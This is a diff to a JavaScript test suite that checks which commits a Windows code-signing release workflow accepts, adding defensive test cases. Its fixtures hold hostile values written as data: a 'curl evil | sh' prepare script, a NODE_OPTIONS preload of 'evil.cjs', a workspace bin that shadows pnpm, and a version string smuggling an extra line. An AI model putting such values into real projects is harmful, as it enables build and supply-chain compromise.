@@ -242,12 +242,23 @@ describe("the source commit the run builds", () => {
     branchWith("candidate", "package.json", rootManifest("0.7.0-rc.1"));
     git(origin, "checkout", "-q", "candidate");
     commits.candidate = commit(origin, "CHANGELOG.md", "0.7.0-rc.1\n");
-    branchWith("sideways", "other", "x\n", `${main}~1`);
+    branchWith("sideways", "README", "main\n", `${main}~1`);
+    commits.sideways = commit(origin, "changelog.d/note.fixed.md", "note\n");
+    branchWith("unpinned", "docs/guide.md", "g\n");
+    commit(origin, ".github/workflows/other.yml", "on: push\n");
+    commits.unpinned = commit(origin, "tools/test/new.test.js", "// test\n");
     branchWith("tooling", "tools/packaged-windows/build-bundle.js", "v2\n");
     branchWith("lockfile", "pnpm-lock.yaml", "lockfileVersion: '9.0'\nevil: true\n");
     branchWith("builder", "packages/app/electron-builder.yml", "appId: orca\nafterSign: x.js\n");
     branchWith("hook", "packages/app/scripts/stage-native.js", "// v2\n");
     branchWith("manifest", "packages/evil/package.json", '{"name":"evil"}\n');
+    branchWith("appSource", "packages/app/src/main.ts", "export {};\n");
+    branchWith("workspaceBin", "tools/eslint-config/package.json", '{"name":"c","bin":{"pnpm":"./x.js"}}\n');
+    branchWith("builderEnv", "packages/app/electron-builder.env", "NODE_OPTIONS=--require ./evil.cjs\n");
+    branchWith("testManifest", "tools/test/package.json", '{"name":"t"}\n');
+    branchWith("attributes", ".gitattributes", "*.yml eol=crlf\n");
+    branchWith("patch", "patches/x.patch", "diff\n");
+    branchWith("badVersion", "package.json", rootManifest("1.0.0\n- forged line"));
     branchWith("rootScripts", "package.json", rootManifest("0.6.0", { prepare: "curl evil | sh" }));
     git(origin, "checkout", "-q", "--detach", main);
     commits.unbranched = commit(origin, "dangling", "d\n");
@@ -273,8 +284,12 @@ describe("the source commit the run builds", () => {
     expect(resolveWith(commits.candidate, main)).toBe(`sha=${commits.candidate}\n`);
   });
 
-  it("accepts a branch that is not a descendant of main when its signing inputs match", () => {
+  it("accepts a branch that is not a descendant of main when its tree otherwise matches", () => {
     expect(resolveWith(commits.sideways, main)).toBe(`sha=${commits.sideways}\n`);
+  });
+
+  it("accepts changes to docs, workflow files and test files", () => {
+    expect(resolveWith(commits.unpinned, main)).toBe(`sha=${commits.unpinned}\n`);
   });
 
   it.each([
@@ -287,6 +302,13 @@ describe("the source commit the run builds", () => {
     ["a commit that changes a packaging script", () => commits.hook],
     ["a commit that adds a workspace package manifest", () => commits.manifest],
     ["a commit that changes the root package.json beyond its version", () => commits.rootScripts],
+    ["a commit that changes application source", () => commits.appSource],
+    ["a commit that adds a bin to a tools workspace package", () => commits.workspaceBin],
+    ["a commit that adds electron-builder.env", () => commits.builderEnv],
+    ["a commit that makes tools/test a workspace package", () => commits.testManifest],
+    ["a commit that changes .gitattributes", () => commits.attributes],
+    ["a commit that changes a dependency patch", () => commits.patch],
+    ["a commit whose version is not plain semver", () => commits.badVersion],
     ["a commit on no branch of the repository", () => commits.unbranched],
     ["a commit reachable only from a tag", () => commits.tagOnly],
     ["a commit reachable only from a pull request ref", () => commits.pullOnly],
@@ -310,6 +332,9 @@ describe("the source commit the run builds", () => {
       expect(checkout.with.ref).toBe("${{ needs.resolve.outputs.sha }}");
     }
     expect(signed.jobs.resolve.permissions).toEqual({ contents: "read" });
+    // resolve lets .github differ from main, which is safe only while no step runs a local action.
+    for (const job of Object.values(signed.jobs))
+      for (const s of job.steps) expect(String(s.uses ?? "")).not.toMatch(/^\.\//);
     expect(JSON.stringify(signed.jobs.resolve)).not.toMatch(/id-token|secrets\./);
     const upload = signed.jobs.sign.steps.find((s) => s.name === "Upload the signed artifacts");
     expect(upload.with.name).toBe("windows-signed-${{ needs.resolve.outputs.sha }}");
